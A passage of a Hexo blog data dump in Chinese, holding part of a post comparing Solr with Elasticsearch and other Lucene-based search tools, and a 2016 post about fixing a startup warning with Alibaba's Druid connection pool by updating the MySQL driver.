Java&#x641C;&#x7D22;&#x5E93;&#x4E3A;&#x6838;&#x5FC3;&#x7684;&#x5168;&#x6587;&#x7D22;&#x5F15;&#x548C;&#x641C;&#x7D22;&#xFF0C;&#x5E76;&#x5177;&#x6709;&#x7C7B;&#x4F3C;REST&#x7684;HTTP/XML&#x548C;JSON&#x7684;API&#x3002;<br>Solr&#x5F3A;&#x5927;&#x7684;&#x5916;&#x90E8;&#x914D;&#x7F6E;&#x529F;&#x80FD;&#x4F7F;&#x5F97;&#x65E0;&#x9700;&#x8FDB;&#x884C;Java&#x7F16;&#x7801;&#xFF0C;&#x4FBF;&#x53EF;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x8C03;&#x6574;&#x4EE5;&#x9002;&#x5E94;&#x591A;&#x79CD;&#x7C7B;&#x578B;&#x7684;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x3002;Solr&#x6709;&#x4E00;&#x4E2A;&#x63D2;&#x4EF6;&#x67B6;&#x6784;&#xFF0C;&#x4EE5;&#x652F;&#x6301;&#x66F4;&#x591A;&#x7684;&#x9AD8;&#x7EA7;&#x5B9A;&#x5236;&#x3002;</p>\n<p>&#x56E0;&#x4E3A;2010&#x5E74; Apache Lucene &#x548C; Apache Solr &#x9879;&#x76EE;&#x5408;&#x5E76;&#xFF0C;&#x4E24;&#x4E2A;&#x9879;&#x76EE;&#x662F;&#x7531;&#x540C;&#x4E00;&#x4E2A;Apache&#x8F6F;&#x4EF6;&#x57FA;&#x91D1;&#x4F1A;&#x5F00;&#x53D1;&#x56E2;&#x961F;&#x5236;&#x4F5C;&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x63D0;&#x5230;&#x6280;&#x672F;&#x6216;&#x4EA7;&#x54C1;&#x65F6;&#xFF0C;Lucene/Solr&#x6216;Solr/Lucene&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002;</p>\n<h4 id=\"&#x4F18;&#x70B9;-1\"><a href=\"#&#x4F18;&#x70B9;-1\" class=\"headerlink\" title=\"&#x4F18;&#x70B9;\"></a>&#x4F18;&#x70B9;</h4><ul>\n<li>Solr&#x6BD4;&#x8F83;&#x6210;&#x719F;&#x3001;&#x7A33;&#x5B9A;&#x3002;</li>\n<li>Solr&#x6709;&#x4E00;&#x4E2A;&#x66F4;&#x5927;&#x3001;&#x66F4;&#x6210;&#x719F;&#x7684;&#x7528;&#x6237;&#x3001;&#x5F00;&#x53D1;&#x548C;&#x8D21;&#x732E;&#x8005;&#x793E;&#x533A;&#x3002;</li>\n<li>&#x652F;&#x6301;&#x6DFB;&#x52A0;&#x591A;&#x79CD;&#x683C;&#x5F0F;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x5982;&#xFF1A;HTML&#x3001;PDF&#x3001;&#x5FAE;&#x8F6F; Office &#x7CFB;&#x5217;&#x8F6F;&#x4EF6;&#x683C;&#x5F0F;&#x4EE5;&#x53CA; JSON&#x3001;XML&#x3001;CSV &#x7B49;&#x7EAF;&#x6587;&#x672C;&#x683C;&#x5F0F;&#x3002;</li>\n<li>&#x4E0D;&#x8003;&#x8651;&#x5EFA;&#x7D22;&#x5F15;&#x7684;&#x540C;&#x65F6;&#x8FDB;&#x884C;&#x641C;&#x7D22;&#xFF0C;&#x901F;&#x5EA6;&#x66F4;&#x5FEB;&#x3002;</li>\n</ul>\n<h4 id=\"&#x7F3A;&#x70B9;-1\"><a href=\"#&#x7F3A;&#x70B9;-1\" class=\"headerlink\" title=\"&#x7F3A;&#x70B9;\"></a>&#x7F3A;&#x70B9;</h4><p><strong>&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x65F6;&#xFF0C;&#x641C;&#x7D22;&#x6548;&#x7387;&#x4E0B;&#x964D;&#xFF0C;&#x5B9E;&#x65F6;&#x7D22;&#x5F15;&#x641C;&#x7D22;&#x6548;&#x7387;&#x4E0D;&#x9AD8;&#x3002;</strong></p>\n<hr>\n<h2 id=\"Elasticsearch&#x4E0E;Solr&#x7684;&#x6BD4;&#x8F83;\"><a href=\"#Elasticsearch&#x4E0E;Solr&#x7684;&#x6BD4;&#x8F83;\" class=\"headerlink\" title=\"Elasticsearch&#x4E0E;Solr&#x7684;&#x6BD4;&#x8F83;\"></a>Elasticsearch&#x4E0E;Solr&#x7684;&#x6BD4;&#x8F83;</h2><p>&#x5F53;&#x5355;&#x7EAF;&#x7684;&#x5BF9;&#x5DF2;&#x6709;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x641C;&#x7D22;&#x65F6;&#xFF0C;Solr&#x66F4;&#x5FEB;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/1.png\" alt=\"&#x56FE;&#x7247;1\"><br>&#x5F53;&#x5B9E;&#x65F6;&#x5EFA;&#x7ACB;&#x7D22;&#x5F15;&#x65F6;, Solr&#x4F1A;&#x4EA7;&#x751F;io&#x963B;&#x585E;&#xFF0C;&#x67E5;&#x8BE2;&#x6027;&#x80FD;&#x8F83;&#x5DEE;, Elasticsearch&#x5177;&#x6709;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/2.png\" alt=\"&#x56FE;&#x7247;2\"><br>&#x968F;&#x7740;&#x6570;&#x636E;&#x91CF;&#x7684;&#x589E;&#x52A0;&#xFF0C;Solr&#x7684;&#x641C;&#x7D22;&#x6548;&#x7387;&#x4F1A;&#x53D8;&#x5F97;&#x66F4;&#x4F4E;&#xFF0C;&#x800C;Elasticsearch&#x5374;&#x6CA1;&#x6709;&#x660E;&#x663E;&#x7684;&#x53D8;&#x5316;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/3.png\" alt=\"&#x56FE;&#x7247;3\"><br>&#x7EFC;&#x4E0A;&#x6240;&#x8FF0;&#xFF0C;Solr&#x7684;&#x67B6;&#x6784;&#x4E0D;&#x9002;&#x5408;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x7684;&#x5E94;&#x7528;&#x3002;</p>\n<p>&#x4E0B;&#x56FE;&#x4E3A;&#x5C06;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x4ECE;Solr&#x8F6C;&#x5230;Elasticsearch&#x4EE5;&#x540E;&#x7684;&#x5E73;&#x5747;&#x67E5;&#x8BE2;&#x901F;&#x5EA6;&#x6709;&#x4E86;50&#x500D;&#x7684;&#x63D0;&#x5347;&#x3002;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Elasticsearch%E4%B8%8ESolr/4.png\" alt=\"&#x56FE;&#x7247;4\"></p>\n<h4 id=\"Elasticsearch-&#x4E0E;-Solr-&#x7684;&#x6BD4;&#x8F83;&#x603B;&#x7ED3;\"><a href=\"#Elasticsearch-&#x4E0E;-Solr-&#x7684;&#x6BD4;&#x8F83;&#x603B;&#x7ED3;\" class=\"headerlink\" title=\"Elasticsearch &#x4E0E; Solr &#x7684;&#x6BD4;&#x8F83;&#x603B;&#x7ED3;\"></a>Elasticsearch &#x4E0E; Solr &#x7684;&#x6BD4;&#x8F83;&#x603B;&#x7ED3;</h4><ul>\n<li>&#x4E8C;&#x8005;&#x5B89;&#x88C5;&#x90FD;&#x5F88;&#x7B80;&#x5355;&#xFF1B;</li>\n<li>Solr &#x5229;&#x7528; Zookeeper &#x8FDB;&#x884C;&#x5206;&#x5E03;&#x5F0F;&#x7BA1;&#x7406;&#xFF0C;&#x800C; Elasticsearch &#x81EA;&#x8EAB;&#x5E26;&#x6709;&#x5206;&#x5E03;&#x5F0F;&#x534F;&#x8C03;&#x7BA1;&#x7406;&#x529F;&#x80FD;;</li>\n<li>Solr &#x652F;&#x6301;&#x66F4;&#x591A;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x800C; Elasticsearch &#x4EC5;&#x652F;&#x6301;json&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#xFF1B;</li>\n<li>Solr &#x5B98;&#x65B9;&#x63D0;&#x4F9B;&#x7684;&#x529F;&#x80FD;&#x66F4;&#x591A;&#xFF0C;&#x800C; Elasticsearch &#x672C;&#x8EAB;&#x66F4;&#x6CE8;&#x91CD;&#x4E8E;&#x6838;&#x5FC3;&#x529F;&#x80FD;&#xFF0C;&#x9AD8;&#x7EA7;&#x529F;&#x80FD;&#x591A;&#x6709;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#x63D0;&#x4F9B;&#xFF1B;</li>\n<li>Solr &#x5728;&#x4F20;&#x7EDF;&#x7684;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x4E2D;&#x8868;&#x73B0;&#x597D;&#x4E8E; Elasticsearch&#xFF0C;&#x4F46;&#x5728;&#x5904;&#x7406;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x65F6;&#x6548;&#x7387;&#x660E;&#x663E;&#x4F4E;&#x4E8E; Elasticsearch&#x3002;</li>\n<li>Solr &#x662F;&#x4F20;&#x7EDF;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x7684;&#x6709;&#x529B;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x4F46; Elasticsearch &#x66F4;&#x9002;&#x7528;&#x4E8E;&#x65B0;&#x5174;&#x7684;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x5E94;&#x7528;&#x3002;</li>\n</ul>\n<hr>\n<h2 id=\"&#x5176;&#x4ED6;&#x57FA;&#x4E8E;Lucene&#x7684;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x89E3;&#x51B3;&#x65B9;&#x6848;\"><a href=\"#&#x5176;&#x4ED6;&#x57FA;&#x4E8E;Lucene&#x7684;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x89E3;&#x51B3;&#x65B9;&#x6848;\" class=\"headerlink\" title=\"&#x5176;&#x4ED6;&#x57FA;&#x4E8E;Lucene&#x7684;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x89E3;&#x51B3;&#x65B9;&#x6848;\"></a>&#x5176;&#x4ED6;&#x57FA;&#x4E8E;Lucene&#x7684;&#x5F00;&#x6E90;&#x641C;&#x7D22;&#x5F15;&#x64CE;&#x89E3;&#x51B3;&#x65B9;&#x6848;</h2><h4 id=\"Lucene\"><a href=\"#Lucene\" class=\"headerlink\" title=\"Lucene\"></a>Lucene</h4><p>&#x8BF4;&#x660E;&#xFF1A;Lucene &#x662F;&#x4E00;&#x4E2A; JAVA &#x641C;&#x7D22;&#x7C7B;&#x5E93;&#xFF0C;&#x5B83;&#x672C;&#x8EAB;&#x5E76;&#x4E0D;&#x662F;&#x4E00;&#x4E2A;&#x5B8C;&#x6574;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x9700;&#x8981;&#x989D;&#x5916;&#x7684;&#x5F00;&#x53D1;&#x5DE5;&#x4F5C;&#x3002;<br>&#x4F18;&#x70B9;&#xFF1A;&#x6210;&#x719F;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x6709;&#x5F88;&#x591A;&#x7684;&#x6210;&#x529F;&#x6848;&#x4F8B;&#x3002;apache &#x9876;&#x7EA7;&#x9879;&#x76EE;&#xFF0C;&#x6B63;&#x5728;&#x6301;&#x7EED;&#x5FEB;&#x901F;&#x7684;&#x8FDB;&#x6B65;&#x3002;&#x5E9E;&#x5927;&#x800C;&#x6D3B;&#x8DC3;&#x7684;&#x5F00;&#x53D1;&#x793E;&#x533A;&#xFF0C;&#x5927;&#x91CF;&#x7684;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x3002;&#x5B83;&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x7C7B;&#x5E93;&#xFF0C;&#x6709;&#x8DB3;&#x591F;&#x7684;&#x5B9A;&#x5236;&#x548C;&#x4F18;&#x5316;&#x7A7A;&#x95F4;&#xFF1A;&#x7ECF;&#x8FC7;&#x7B80;&#x5355;&#x5B9A;&#x5236;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x6EE1;&#x8DB3;&#x7EDD;&#x5927;&#x90E8;&#x5206;&#x5E38;&#x89C1;&#x7684;&#x9700;&#x6C42;&#xFF1B;&#x7ECF;&#x8FC7;&#x4F18;&#x5316;&#xFF0C;&#x53EF;&#x4EE5;&#x652F;&#x6301; 10&#x4EBF;+ &#x91CF;&#x7EA7;&#x7684;&#x641C;&#x7D22;&#x3002;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x9700;&#x8981;&#x989D;&#x5916;&#x7684;&#x5F00;&#x53D1;&#x5DE5;&#x4F5C;&#x3002;&#x6240;&#x6709;&#x7684;&#x6269;&#x5C55;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x9760;&#x6027;&#x7B49;&#x90FD;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#xFF1B;&#x975E;&#x5B9E;&#x65F6;&#xFF0C;&#x4ECE;&#x5EFA;&#x7D22;&#x5F15;&#x5230;&#x53EF;&#x4EE5;&#x641C;&#x7D22;&#x4E2D;&#x95F4;&#x6709;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x5EF6;&#x8FDF;&#xFF0C;&#x800C;&#x5F53;&#x524D;&#x7684;&#x201C;&#x8FD1;&#x5B9E;&#x65F6;&#x201D;(Lucene Near Real Time search)&#x641C;&#x7D22;&#x65B9;&#x6848;&#x7684;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x6709;&#x5F85;&#x8FDB;&#x4E00;&#x6B65;&#x5B8C;&#x5584;</p>\n<h4 id=\"Katta\"><a href=\"#Katta\" class=\"headerlink\" title=\"Katta\"></a>Katta</h4><p>&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene &#x7684;&#xFF0C;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x6269;&#x5C55;&#xFF0C;&#x5177;&#x6709;&#x5BB9;&#x9519;&#x529F;&#x80FD;&#xFF0C;&#x51C6;&#x5B9E;&#x65F6;&#x7684;&#x641C;&#x7D22;&#x65B9;&#x6848;&#x3002;<br>&#x4F18;&#x70B9;&#xFF1A;&#x5F00;&#x7BB1;&#x5373;&#x7528;&#xFF0C;&#x53EF;&#x4EE5;&#x4E0E; Hadoop &#x914D;&#x5408;&#x5B9E;&#x73B0;&#x5206;&#x5E03;&#x5F0F;&#x3002;&#x5177;&#x5907;&#x6269;&#x5C55;&#x548C;&#x5BB9;&#x9519;&#x673A;&#x5236;&#x3002;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x53EA;&#x662F;&#x641C;&#x7D22;&#x65B9;&#x6848;&#xFF0C;&#x5EFA;&#x7D22;&#x5F15;&#x90E8;&#x5206;&#x8FD8;&#x662F;&#x9700;&#x8981;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x3002;&#x5728;&#x641C;&#x7D22;&#x529F;&#x80FD;&#x4E0A;&#xFF0C;&#x53EA;&#x5B9E;&#x73B0;&#x4E86;&#x6700;&#x57FA;&#x672C;&#x7684;&#x9700;&#x6C42;&#x3002;&#x6210;&#x529F;&#x6848;&#x4F8B;&#x8F83;&#x5C11;&#xFF0C;&#x9879;&#x76EE;&#x7684;&#x6210;&#x719F;&#x5EA6;&#x7A0D;&#x5FAE;&#x5DEE;&#x4E00;&#x4E9B;&#x3002;&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E9B;&#x590D;&#x6742;&#x7684;&#x67E5;&#x8BE2;&#x9700;&#x6C42;&#xFF0C;&#x5B9A;&#x5236;&#x7684;&#x96BE;&#x5EA6;&#x4F1A;&#x6BD4;&#x8F83;&#x5927;&#x3002;</p>\n<h4 id=\"Hadoop-contrib-index\"><a href=\"#Hadoop-contrib-index\" class=\"headerlink\" title=\"Hadoop contrib/index\"></a>Hadoop contrib/index</h4><p>&#x8BF4;&#x660E;&#xFF1A;Map/Reduce &#x6A21;&#x5F0F;&#x7684;&#xFF0C;&#x5206;&#x5E03;&#x5F0F;&#x5EFA;&#x7D22;&#x5F15;&#x65B9;&#x6848;&#xFF0C;&#x53EF;&#x4EE5;&#x8DDF; Katta &#x914D;&#x5408;&#x4F7F;&#x7528;&#x3002;<br>&#x4F18;&#x70B9;&#xFF1A;&#x5206;&#x5E03;&#x5F0F;&#x5EFA;&#x7D22;&#x5F15;&#xFF0C;&#x5177;&#x5907;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x3002;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x53EA;&#x662F;&#x5EFA;&#x7D22;&#x5F15;&#x65B9;&#x6848;&#xFF0C;&#x4E0D;&#x5305;&#x62EC;&#x641C;&#x7D22;&#x5B9E;&#x73B0;&#x3002;&#x5DE5;&#x4F5C;&#x5728;&#x6279;&#x5904;&#x7406;&#x6A21;&#x5F0F;&#xFF0C;&#x5BF9;&#x5B9E;&#x65F6;&#x641C;&#x7D22;&#x7684;&#x652F;&#x6301;&#x4E0D;&#x4F73;&#x3002;</p>\n<h4 id=\"LinkedIn-&#x7684;&#x5F00;&#x6E90;&#x65B9;&#x6848;\"><a href=\"#LinkedIn-&#x7684;&#x5F00;&#x6E90;&#x65B9;&#x6848;\" class=\"headerlink\" title=\"LinkedIn &#x7684;&#x5F00;&#x6E90;&#x65B9;&#x6848;\"></a>LinkedIn &#x7684;&#x5F00;&#x6E90;&#x65B9;&#x6848;</h4><p>&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene &#x7684;&#x4E00;&#x7CFB;&#x5217;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x5305;&#x62EC; &#x51C6;&#x5B9E;&#x65F6;&#x641C;&#x7D22; zoie &#xFF0C;facet &#x641C;&#x7D22;&#x5B9E;&#x73B0; bobo &#xFF0C;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7B97;&#x6CD5; decomposer &#xFF0C;&#x6458;&#x8981;&#x5B58;&#x50A8;&#x5E93; krati &#xFF0C;&#x6570;&#x636E;&#x5E93;&#x6A21;&#x5F0F;&#x5305;&#x88C5; sensei &#x7B49;&#x7B49;<br>&#x4F18;&#x70B9;&#xFF1A;&#x7ECF;&#x8FC7;&#x9A8C;&#x8BC1;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x652F;&#x6301;&#x5206;&#x5E03;&#x5F0F;&#xFF0C;&#x53EF;&#x6269;&#x5C55;&#xFF0C;&#x4E30;&#x5BCC;&#x7684;&#x529F;&#x80FD;&#x5B9E;&#x73B0;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x4E0E; linkedin &#x516C;&#x53F8;&#x7684;&#x8054;&#x7CFB;&#x592A;&#x7D27;&#x5BC6;&#xFF0C;&#x53EF;&#x5B9A;&#x5236;&#x6027;&#x6BD4;&#x8F83;&#x5DEE;</p>\n<h4 id=\"Lucandra\"><a href=\"#Lucandra\" class=\"headerlink\" title=\"Lucandra\"></a>Lucandra</h4><p>&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene&#xFF0C;&#x7D22;&#x5F15;&#x5B58;&#x5728; cassandra &#x6570;&#x636E;&#x5E93;&#x4E2D;<br>&#x4F18;&#x70B9;&#xFF1A;&#x53C2;&#x8003; cassandra &#x7684;&#x4F18;&#x70B9;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x53C2;&#x8003; cassandra &#x7684;&#x7F3A;&#x70B9;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x8FD9;&#x53EA;&#x662F;&#x4E00;&#x4E2A; demo&#xFF0C;&#x6CA1;&#x6709;&#x7ECF;&#x8FC7;&#x5927;&#x91CF;&#x9A8C;&#x8BC1;</p>\n<h4 id=\"HBasene\"><a href=\"#HBasene\" class=\"headerlink\" title=\"HBasene\"></a>HBasene</h4><p>&#x8BF4;&#x660E;&#xFF1A;&#x57FA;&#x4E8E; Lucene&#xFF0C;&#x7D22;&#x5F15;&#x5B58;&#x5728; HBase &#x6570;&#x636E;&#x5E93;&#x4E2D;<br>&#x4F18;&#x70B9;&#xFF1A;&#x53C2;&#x8003; HBase &#x7684;&#x4F18;&#x70B9;<br>&#x7F3A;&#x70B9;&#xFF1A;&#x53C2;&#x8003; HBase &#x7684;&#x7F3A;&#x70B9;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5728;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;lucene terms &#x662F;&#x5B58;&#x6210;&#x884C;&#xFF0C;&#x4F46;&#x6BCF;&#x4E2A; term &#x5BF9;&#x5E94;&#x7684; posting lists &#x662F;&#x4EE5;&#x5217;&#x7684;&#x65B9;&#x5F0F;&#x5B58;&#x50A8;&#x7684;&#x3002;&#x968F;&#x7740;&#x5355;&#x4E2A; term &#x7684; posting lists &#x7684;&#x589E;&#x5927;&#xFF0C;&#x67E5;&#x8BE2;&#x65F6;&#x7684;&#x901F;&#x5EA6;&#x53D7;&#x5230;&#x7684;&#x5F71;&#x54CD;&#x4F1A;&#x975E;&#x5E38;&#x5927;</p>"},{"title":"Druid","date":"2016-04-24T14:10:00.000Z","toc":false,"_content":"\n**Druid是阿里巴巴的开源项目，它在监控、可扩展性、稳定性和性能方面，相对于其他数据库连接池都有较明显的优势**\n\n### 网站\n官网介绍：[https://github.com/alibaba/druid/wiki/常见问题](https://github.com/alibaba/druid/wiki/常见问题)\n阿里巴巴开源项目Druid负责人温少访谈：[http://www.iteye.com/magazines/90](http://www.iteye.com/magazines/90)  \n配置方法如下：[http://blog.csdn.net/pk490525/article/details/12621649](http://blog.csdn.net/pk490525/article/details/12621649)  \n\n\n### 问题\n**实践遇到的问题**：官网下载 druid-1.0.17.jar，引入并配置好相关文件后，启动报了一个警告\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/Druid/1.png)\n\n**查看源码如下**：\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/Druid/2.png)\n\n**原因**：应该是mysql驱动太老了，因为下载的druid-1.0.17.jar是16年最新发布的，去mysql官网下载最新jar包后，问题解决\n\n### 运行结果\n启动后项目，http://localhost:8080/ichargerclouds/druid/index.html\n监控页面运行如下：\n\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/Druid/3.png)","source":"_posts/Druid.md","raw":"---\ntitle: Druid\ncategories:\n  - WEB后端\ntags:\n  - Druid\ndate: 2016-4-24 22:10:00\ntoc: false\n\n---\n\n**Druid是阿里巴巴的开源项目，它在监控、可扩展性、稳定性和性能方面，相对于其他数据库连接池都有较明显的优势**\n\n### 网站\n官网介绍：[https://github.com/alibaba/druid/wiki/常见问题](https://github.com/alibaba/druid/wiki/常见问题)\n阿里巴巴开源项目Druid负责人温少访谈：[http://www.iteye.com/magazines/90](http://www.iteye.com/magazines/90)  \n配置方法如下：[http://blog.csdn.net/pk490525/article/details/12621649](http://blog.csdn.net/pk490525/article/details/12621649)  \n\n\n### 问题\n**实践遇到的问题**：官网下载 druid-1.0.17.jar，引入并配置好相关文件后，启动报了一个警告\n\n![图片1](http://7xvfir.com1.z0.glb.clouddn.com/Druid/1.png)\n\n**查看源码如下**：\n![图片2](http://7xvfir.com1.z0.glb.clouddn.com/Druid/2.png)\n\n**原因**：应该是mysql驱动太老了，因为下载的druid-1.0.17.jar是16年最新发布的，去mysql官网下载最新jar包后，问题解决\n\n### 运行结果\n启动后项目，http://localhost:8080/ichargerclouds/druid/index.html\n监控页面运行如下：\n\n![图片3](http://7xvfir.com1.z0.glb.clouddn.com/Druid/3.png)","slug":"Druid","published":1,"updated":"2016-11-17T11:59:42.662Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulao000egwtm9pfhc4qo","content":"<p><strong>Druid&#x662F;&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#xFF0C;&#x5B83;&#x5728;&#x76D1;&#x63A7;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x3001;&#x7A33;&#x5B9A;&#x6027;&#x548C;&#x6027;&#x80FD;&#x65B9;&#x9762;&#xFF0C;&#x76F8;&#x5BF9;&#x4E8E;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x6C60;&#x90FD;&#x6709;&#x8F83;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;</strong></p>\n<h3 id=\"&#x7F51;&#x7AD9;\"><a href=\"#&#x7F51;&#x7AD9;\" class=\"headerlink\" title=\"&#x7F51;&#x7AD9;\"></a>&#x7F51;&#x7AD9;</h3><p>&#x5B98;&#x7F51;&#x4ECB;&#x7ECD;&#xFF1A;<a href=\"https://github.com/alibaba/druid/wiki/&#x5E38;&#x89C1;&#x95EE;&#x9898;\" target=\"_blank\" rel=\"external\">https://github.com/alibaba/druid/wiki/&#x5E38;&#x89C1;&#x95EE;&#x9898;</a><br>&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x5F00;&#x6E90;&#x9879;&#x76EE;Druid&#x8D1F;&#x8D23;&#x4EBA;&#x6E29;&#x5C11;&#x8BBF;&#x8C08;&#xFF1A;<a href=\"http://www.iteye.com/magazines/90\" target=\"_blank\" rel=\"external\">http://www.iteye.com/magazines/90</a><br>&#x914D;&#x7F6E;&#x65B9;&#x6CD5;&#x5982;&#x4E0B;&#xFF1A;<a href=\"http://blog.csdn.net/pk490525/article/details/12621649\" target=\"_blank\" rel=\"external\">http://blog.csdn.net/pk490525/article/details/12621649</a>  </p>\n<h3 id=\"&#x95EE;&#x9898;\"><a href=\"#&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x95EE;&#x9898;\"></a>&#x95EE;&#x9898;</h3><p><strong>&#x5B9E;&#x8DF5;&#x9047;&#x5230;&#x7684;&#x95EE;&#x9898;</strong>&#xFF1A;&#x5B98;&#x7F51;&#x4E0B;&#x8F7D; druid-1.0.17.jar&#xFF0C;&#x5F15;&#x5165;&#x5E76;&#x914D;&#x7F6E;&#x597D;&#x76F8;&#x5173;&#x6587;&#x4EF6;&#x540E;&#xFF0C;&#x542F;&#x52A8;&#x62A5;&#x4E86;&#x4E00;&#x4E2A;&#x8B66;&#x544A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Druid/1.png\" alt=\"&#x56FE;&#x7247;1\"></p>\n<p><strong>&#x67E5;&#x770B;&#x6E90;&#x7801;&#x5982;&#x4E0B;</strong>&#xFF1A;<br><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Druid/2.png\" alt=\"&#x56FE;&#x7247;2\"></p>\n<p><strong>&#x539F;&#x56E0;</strong>&#xFF1A;&#x5E94;&#x8BE5;&#x662F;mysql&#x9A71;&#x52A8;&#x592A;&#x8001;&#x4E86;&#xFF0C;&#x56E0;&#x4E3A;&#x4E0B;&#x8F7D;&#x7684;druid-1.0.17.jar&#x662F;16&#x5E74;&#x6700;&#x65B0;&#x53D1;&#x5E03;&#x7684;&#xFF0C;&#x53BB;mysql&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;&#x6700;&#x65B0;jar&#x5305;&#x540E;&#xFF0C;&#x95EE;&#x9898;&#x89E3;&#x51B3;</p>\n<h3 id=\"&#x8FD0;&#x884C;&#x7ED3;&#x679C;\"><a href=\"#&#x8FD0;&#x884C;&#x7ED3;&#x679C;\" class=\"headerlink\" title=\"&#x8FD0;&#x884C;&#x7ED3;&#x679C;\"></a>&#x8FD0;&#x884C;&#x7ED3;&#x679C;</h3><p>&#x542F;&#x52A8;&#x540E;&#x9879;&#x76EE;&#xFF0C;<a href=\"http://localhost:8080/ichargerclouds/druid/index.html\" target=\"_blank\" rel=\"external\">http://localhost:8080/ichargerclouds/druid/index.html</a><br>&#x76D1;&#x63A7;&#x9875;&#x9762;&#x8FD0;&#x884C;&#x5982;&#x4E0B;&#xFF1A;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Druid/3.png\" alt=\"&#x56FE;&#x7247;3\"></p>\n","excerpt":"","more":"<p><strong>Druid&#x662F;&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x7684;&#x5F00;&#x6E90;&#x9879;&#x76EE;&#xFF0C;&#x5B83;&#x5728;&#x76D1;&#x63A7;&#x3001;&#x53EF;&#x6269;&#x5C55;&#x6027;&#x3001;&#x7A33;&#x5B9A;&#x6027;&#x548C;&#x6027;&#x80FD;&#x65B9;&#x9762;&#xFF0C;&#x76F8;&#x5BF9;&#x4E8E;&#x5176;&#x4ED6;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x6C60;&#x90FD;&#x6709;&#x8F83;&#x660E;&#x663E;&#x7684;&#x4F18;&#x52BF;</strong></p>\n<h3 id=\"&#x7F51;&#x7AD9;\"><a href=\"#&#x7F51;&#x7AD9;\" class=\"headerlink\" title=\"&#x7F51;&#x7AD9;\"></a>&#x7F51;&#x7AD9;</h3><p>&#x5B98;&#x7F51;&#x4ECB;&#x7ECD;&#xFF1A;<a 